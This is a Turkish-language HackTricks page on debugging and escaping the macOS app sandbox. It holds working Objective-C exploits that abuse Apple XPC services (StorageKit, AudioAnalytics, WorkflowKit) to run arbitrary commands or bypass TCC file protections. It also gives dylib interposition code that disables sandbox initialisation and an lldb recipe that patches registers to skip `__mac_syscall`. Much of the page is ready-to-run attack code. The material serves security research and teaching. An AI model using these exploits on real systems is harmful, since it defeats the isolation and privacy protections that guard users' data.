# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox yükleme süreci

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Resim <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a> adresinden alınmıştır.</p></figcaption></figure>

Önceki resimde, **`com.apple.security.app-sandbox`** yetkisine sahip bir uygulama çalıştırıldığında **sandbox'ın nasıl yükleneceği** gözlemlenebilir.

Derleyici, `/usr/lib/libSystem.B.dylib` dosyasını ikili dosyaya bağlayacaktır.

Daha sonra, **`libSystem.B`**, **`xpc_pipe_routine`** uygulamanın yetkilerini **`securityd`**'ye gönderene kadar diğer birkaç fonksiyonu çağıracaktır. Securityd, sürecin Sandbox içinde karantinaya alınması gerekip gerekmediğini kontrol eder ve eğer öyleyse, karantinaya alır.\
Son olarak, sandbox, **`__sandbox_ms`** çağrısıyla etkinleştirilecek ve bu da **`__mac_syscall`**'ı çağıracaktır.

## Olası Bypass'ler

### Karantina niteliğini atlama

**Sandbox'lı süreçler tarafından oluşturulan dosyalar**, sandbox kaçışını önlemek için **karantina niteliği** eklenir. Ancak, eğer bir sandbox'lı uygulama içinde **karantina niteliği olmayan bir `.app` klasörü oluşturmayı başarırsanız**, uygulama paketinin ikili dosyasını **`/bin/bash`**'e yönlendirebilir ve **plist** içinde bazı çevre değişkenleri ekleyerek **`open`** komutunu kötüye kullanarak **yeni uygulamayı sandbox'sız başlatabilirsiniz**.

Bu, [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**'te yapılan şeydir.**

> [!CAUTION]
> Bu nedenle, şu anda, eğer sadece **karantina niteliği** olmayan bir isimle biten bir **`.app`** klasörü oluşturabiliyorsanız, sandbox'tan kaçabilirsiniz çünkü macOS yalnızca **`.app` klasörü** ve **ana çalıştırılabilir** dosyada **karantina** niteliğini **kontrol eder** (ve biz ana çalıştırılabilir dosyayı **`/bin/bash`**'e yönlendireceğiz).
>
> Eğer bir .app paketi zaten çalıştırılmak üzere yetkilendirilmişse (çalıştırılmak üzere yetkilendirilmiş bayrağı olan bir karantina xttr'ı varsa), bunu da kötüye kullanabilirsiniz... tek farkla ki artık **`.app`** paketleri içinde yazamazsınız, eğer bazı ayrıcalıklı TCC izinleriniz yoksa (ki bunlar yüksek bir sandbox içinde olmayacaktır).

### Open işlevselliğini kötüye kullanma

[**Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) son örneklerinde, **`open`** cli işlevselliğinin sandbox'ı atlamak için nasıl kötüye kullanılabileceği görülebilir.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Başlatma Ajanları/Daemon'ları

Bir uygulama **sandbox'lı olacak şekilde tasarlanmışsa** (`com.apple.security.app-sandbox`), örneğin bir LaunchAgent'tan **çalıştırıldığında** sandbox'ı atlamak mümkündür.\
[**bu yazıda**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) açıklandığı gibi, sandbox'lı bir uygulama ile kalıcılık kazanmak istiyorsanız, otomatik olarak bir LaunchAgent olarak çalıştırılmasını sağlayabilir ve belki de DyLib çevre değişkenleri aracılığıyla kötü niyetli kod enjekte edebilirsiniz.

### Otomatik Başlatma Konumlarını Kötüye Kullanma

Eğer bir sandbox'lı süreç, **sonrasında bir sandbox'sız uygulamanın ikili dosyasını çalıştıracağı** bir yere **yazabiliyorsa**, oraya ikili dosyayı yerleştirerek **kaçabilir**. Bu tür konumların iyi bir örneği `~/Library/LaunchAgents` veya `/System/Library/LaunchDaemons`'dır.

Bunun için belki de **2 adım** gerekebilir: Daha **izinli bir sandbox** (`file-read*`, `file-write*`) ile bir sürecin kodunuzu çalıştırmasını sağlamak ve bu kodun aslında **sandbox'sız çalıştırılacağı** bir yere yazmasını sağlamak.

**Otomatik Başlatma konumları** hakkında bu sayfayı kontrol edin:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Diğer süreçleri kötüye kullanma

Eğer o sandbox sürecinden, daha az kısıtlayıcı sandbox'larda (veya hiç) çalışan **diğer süreçleri tehlikeye atabiliyorsanız**, onların sandbox'larından kaçabilirsiniz:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Mevcut Sistem ve Kullanıcı Mach hizmetleri

Sandbox, ayrıca `application.sb` profilinde tanımlanan belirli **Mach hizmetleri** ile iletişim kurmaya da izin verir. Eğer bu hizmetlerden birini **kötüye kullanmayı** başarırsanız, **sandbox'tan kaçabilirsiniz**.

[Bu yazıda](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) belirtildiği gibi, Mach hizmetleri hakkında bilgi `/System/Library/xpc/launchd.plist` dosyasında saklanır. Tüm Sistem ve Kullanıcı Mach hizmetlerini bulmak için o dosyada `<string>System</string>` ve `<string>User</string>` araması yapabilirsiniz.

Ayrıca, bir Mach hizmetinin sandbox'lı bir uygulama için mevcut olup olmadığını kontrol etmek için `bootstrap_look_up` çağrısı yapabilirsiniz:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Mevcut PID Mach hizmetleri

Bu Mach hizmetleri, [bu yazıda sandbox'tan kaçmak için ilk olarak istismar edildi](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). O zaman, **bir uygulama ve çerçevesi tarafından gereken tüm XPC hizmetleri** uygulamanın PID alanında görünür durumdaydı (bunlar `ServiceType` olarak `Application` olan Mach Hizmetleridir).

Bir **PID Domain XPC hizmeti ile iletişim kurmak için**, uygulama içinde şu şekilde kaydetmek yeterlidir:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Ayrıca, tüm **Application** Mach hizmetlerini `System/Library/xpc/launchd.plist` içinde `<string>Application</string>` arayarak bulmak mümkündür.

Geçerli xpc hizmetlerini bulmanın bir diğer yolu ise şunları kontrol etmektir:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Bu tekniği kötüye kullanan birkaç örnek [**orijinal yazıda**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) bulunabilir, ancak aşağıda bazı özetlenmiş örnekler verilmiştir.

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Bu hizmet, her XPC bağlantısına her zaman `YES` döndürerek izin verir ve `runTask:arguments:withReply:` metodu, keyfi bir komutu keyfi parametrelerle çalıştırır.

Sömürü "şu kadar basitti":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Bu XPC servisi, her istemciye her zaman YES döndürerek izin verdi ve `createZipAtPath:hourThreshold:withReply:` metodu, sıkıştırılacak bir klasörün yolunu belirtmeye olanak tanıdı ve bunu bir ZIP dosyası olarak sıkıştırdı.

Bu nedenle, sahte bir uygulama klasör yapısı oluşturmak, sıkıştırmak, ardından açmak ve çalıştırmak mümkün, çünkü yeni dosyalar karantina niteliğine sahip olmayacak.

Sömürü şuydu:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Bu XPC servisi, `extendAccessToURL:completion:` yöntemi aracılığıyla XPC istemcisine keyfi bir URL'ye okuma ve yazma erişimi verme imkanı tanır ve bu yöntem herhangi bir bağlantıyı kabul eder. XPC servisi FDA'ya sahip olduğundan, bu izinlerin kötüye kullanılması TCC'yi tamamen atlatmak için mümkündür.

Sömürü şuydu:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statik Derleme & Dinamik Bağlama

[**Bu araştırma**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) Sandbox'ı atlatmanın 2 yolunu keşfetti. Çünkü sandbox, **libSystem** kütüphanesi yüklendiğinde kullanıcı alanından uygulanır. Eğer bir ikili bu kütüphaneyi yüklemekten kaçınabilirse, asla sandbox'a alınmaz:

- Eğer ikili **tamamen statik olarak derlenmişse**, o kütüphaneyi yüklemekten kaçınabilir.
- Eğer **ikili herhangi bir kütüphaneyi yüklemeye ihtiyaç duymuyorsa** (çünkü bağlayıcı da libSystem'dadır), libSystem'i yüklemesine gerek kalmaz.

### Shell Kodları

**Shell kodlarının** ARM64'te bile `libSystem.dylib` içinde bağlanması gerektiğini unutmayın:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Devralınmayan kısıtlamalar

**[bu yazının bonusunda](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** açıklandığı gibi, bir sandbox kısıtlaması şöyle:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
yeni bir sürecin örneğin çalıştırılmasıyla atlatılabilir:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Ancak, elbette, bu yeni süreç ebeveyn süreçten haklar veya ayrıcalıklar miras almayacaktır.

### Haklar

Bir uygulama belirli bir **hakka** sahipse, bazı **hareketlerin** **sandbox tarafından izin verilebileceğini** unutmayın, örneğin:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Daha fazla bilgi için **Interposting** kontrol edin:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Sandbox'ı önlemek için `_libsecinit_initializer`'ı interpost et
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` Sandbox'ı önlemek için
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & bypass Sandbox with lldb

Sandbox'lanması gereken bir uygulama derleyelim:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Sonra uygulamayı derleyin:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Uygulama **`~/Desktop/del.txt`** dosyasını **Sandbox'ın izin vermeyeceği** şekilde **okumaya** çalışacak.\
> Sandbox aşıldığında okuyabilmesi için orada bir dosya oluşturun:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Uygulamayı hata ayıklayalım ve Sandbox'ın ne zaman yüklendiğini görelim:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Sandbox atlatılsa bile TCC** kullanıcıdan sürecin masaüstünden dosya okumak isteyip istemediğini soracaktır.

## References

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
